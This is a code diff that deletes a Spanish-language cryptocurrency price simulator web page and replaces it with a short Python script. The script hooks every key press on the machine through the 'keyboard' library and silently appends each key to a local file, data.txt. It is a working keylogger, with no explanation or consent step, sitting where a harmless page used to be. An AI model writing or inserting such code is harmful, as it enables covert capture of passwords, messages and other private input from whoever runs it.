@@ -1,119 +1,13 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simulador de Criptomoneda</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f5f5f5;
-        }
-        .container {
-            width: 800px;
-            background-color: #fff;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 5px;
-            overflow: hidden;
-            padding: 20px;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .buttons {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-        .button {
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .button.sell {
-            background-color: #f44336;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>Simulador de Criptomoneda</h1>
-            <h2>Precio Actual: <span id="price">1000</span> USD</h2>
-        </div>
-        <div class="buttons">
-            <button class="button buy" onclick="buy()">Comprar</button>
-            <button class="button sell" onclick="sell()">Vender</button>
-        </div>
-        <canvas id="chart" width="800" height="400"></canvas>
-    </div>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <script>
-        const ctx = document.getElementById('chart').getContext('2d');
-        let price = 1000;
-        let prices = [price];
-        let buyDemand = 0;
-        let sellDemand = 0;
+import keyboard
 
-        const chart = new Chart(ctx, {
-            type: 'line', // Using line chart as a simplified example
-            data: {
-                labels: [],
-                datasets: [{
-                    label: 'Precio de la Criptomoneda',
-                    data: prices,
-                    borderColor: 'green',
-                    borderWidth: 2,
-                    fill: false,
-                    tension: 0.1
-                }]
-            },
-            options: {
-                scales: {
-                    x: {
-                        type: 'time',
-                        time: {
-                            unit: 'second'
-                        }
-                    }
-                }
-            }
-        });
+def pressedkeys(key):
 
-        function updatePrice() {
-            const demandFactor = 1 + (buyDemand - sellDemand) * 0.001;
-            price = Math.max(1, price * demandFactor); // Ensure price doesn't go below 1
-            prices.push(price);
+    with open("data.txt", "a") as file:
 
-            chart.data.labels.push(new Date());
-            chart.data.datasets[0].data.push(price);
-            chart.update();
+        if key.name == "space":
+            file.write(" ")
+        else:
+            file.write(key.name)
 
-            document.getElementById('price').innerText = price.toFixed(2);
-
-            buyDemand = 0;
-            sellDemand = 0;
-
-            setTimeout(updatePrice, 1000);
-        }
-
-        function buy() {
-            buyDemand++;
-        }
-
-        function sell() {
-            sellDemand++;
-        }
-
-        updatePrice();
-    </script>
-</body>
-</html>
+keyboard.on_press(pressedkeys)
+keyboard.wait()
